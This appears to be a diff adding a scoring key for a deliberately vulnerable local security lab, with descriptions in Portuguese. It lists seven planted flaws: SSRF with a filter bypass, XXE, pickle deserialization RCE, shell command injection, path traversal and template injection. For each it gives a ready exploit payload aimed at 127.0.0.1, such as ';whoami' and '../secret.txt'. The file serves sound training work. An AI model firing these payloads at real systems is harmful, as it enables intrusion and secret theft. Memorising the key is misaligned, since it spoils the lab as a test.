@@ -1,0 +1,49 @@
+{
+  "lab": "03-relaykit",
+  "base_url": "http://127.0.0.1:18803",
+  "stack": "python-stdlib (server-side exploitation focus)",
+  "vulns": [
+    {
+      "id": "SS1", "class": "ssrf", "severity": "high", "route": "/fetch",
+      "desc": "SSRF pleno: /fetch?url= faz urlopen server-side de qualquer URL e devolve o corpo — alcança o endpoint interno /internal/secrets (só acessível do servidor).",
+      "exploit": "curl 'http://127.0.0.1:18803/fetch?url=http://127.0.0.1:18803/internal/secrets' -> db_password, aws key, service token",
+      "points": 1
+    },
+    {
+      "id": "SS2", "class": "ssrf", "severity": "high", "route": "/preview",
+      "desc": "SSRF com blocklist fraca: /preview?url= usa blocklist case-sensitive por substring ('127.0.0.1'/'localhost'), bypassável por variação de caixa (LocalHost), credenciais embutidas ou encoding alternativo do IP.",
+      "exploit": "curl 'http://127.0.0.1:18803/preview?url=http://LocalHost:18803/internal/secrets' (caixa diferente fura o filtro)",
+      "points": 1
+    },
+    {
+      "id": "XX1", "class": "xxe", "severity": "high", "route": "/import-xml",
+      "desc": "XXE: POST /import-xml parseia XML com entidades externas habilitadas (feature_external_ges) — leitura de arquivo local (file://) e SSRF (http SYSTEM entity).",
+      "exploit": "POST XML com <!DOCTYPE x [<!ENTITY e SYSTEM 'file:///.../secret.txt'>]><x>&e;</x> -> conteúdo do arquivo refletido em parsed_text.",
+      "points": 1
+    },
+    {
+      "id": "DS1", "class": "deserialization", "severity": "critical", "route": "/restore",
+      "desc": "Desserialização insegura: POST /restore faz pickle.loads de input base64 controlado pelo atacante -> RCE via gadget __reduce__ (no lab a execução é bloqueada por segurança, mas o gadget perigoso é resolvido = vuln confirmada).",
+      "exploit": "pickle com __reduce__ -> (os.system, ('id',)); base64; POST /restore -> resposta confirma 'resolved_gadget: os.system' (RCE em deploy real).",
+      "points": 1
+    },
+    {
+      "id": "RC1", "class": "rce", "severity": "critical", "route": "/ping",
+      "desc": "OS command injection: /ping?host= concatena o host num comando shell -> injeção via ; | & (no lab só canários read-only whoami/id/echo executam de fato).",
+      "exploit": "curl 'http://127.0.0.1:18803/ping?host=x;whoami' -> output do whoami no campo 'output'.",
+      "points": 1
+    },
+    {
+      "id": "LF1", "class": "lfi", "severity": "high", "route": "/download",
+      "desc": "Path traversal / LFI: /download?file= junta o parâmetro à pasta files/ sem normalizar -> ../ lê arquivos arbitrários do servidor.",
+      "exploit": "curl 'http://127.0.0.1:18803/download?file=../secret.txt' (ou ../../../../Windows/win.ini) -> conteúdo do arquivo.",
+      "points": 1
+    },
+    {
+      "id": "ST1", "class": "ssti", "severity": "high", "route": "/render",
+      "desc": "Server-Side Template Injection (format-string): /render?name= é concatenado num template .format() -> acesso a internos de objeto e vazamento de segredos do config.",
+      "exploit": "curl 'http://127.0.0.1:18803/render?name={config[SECRET_KEY]}' -> vaza APP_CONFIG SECRET_KEY no greeting.",
+      "points": 1
+    }
+  ]
+}
